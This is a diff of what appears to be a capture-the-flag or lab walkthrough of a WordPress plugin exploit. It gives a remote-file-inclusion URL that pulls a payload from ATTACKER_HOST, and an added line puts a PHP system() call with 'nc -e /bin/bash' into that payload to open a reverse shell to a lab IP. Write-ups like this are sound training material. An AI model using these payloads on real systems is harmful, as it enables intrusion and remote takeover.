@@ -156,14 +156,16 @@ Enumerated top 200 UDP ports:
 
 #### -Input http://WEBSITE/wordpress/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://ATTACKER_HOST/payload.txt instead of listed http://WEBSITE/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://ATTACKER_HOST/payload.txt as shown in the wpscan exploit showing previously as the previous weblogin page started with "/wordpress/" directory shown below and received the following webpage finding the user "takis":  
 
+![](Pasted%20image%2020221018222059.png)
 
+![](Pasted%20image%2020221018222141.png)
 
 ---
 
 # Exploitation
 ## Name of the technique
-Lorem ipsum dolor sit amet, consectetur adipiscing elit. Quisque sit amet tortor scelerisque, fringilla sapien sit amet, rhoncus lorem. Nullam imperdiet nisi ut tortor eleifend tincidunt. Mauris in aliquam orci. Nam congue sollicitudin ex, sit amet placerat ipsum congue quis. Maecenas et ligula et libero congue sollicitudin non eget neque. Phasellus bibendum ornare magna. Donec a gravida lacus.
 
+#### -Typed vim payload.txt and changed the cat etc/passwd script with "<pre>system('nc -e /bin/bash 192.168.49.213 5002')</pre>" and ran penelope program (which is better than netcat listener) which automatically upgrades the TTY terminal and received reverse shell: 
 ---
 
 # Lateral Movement to user
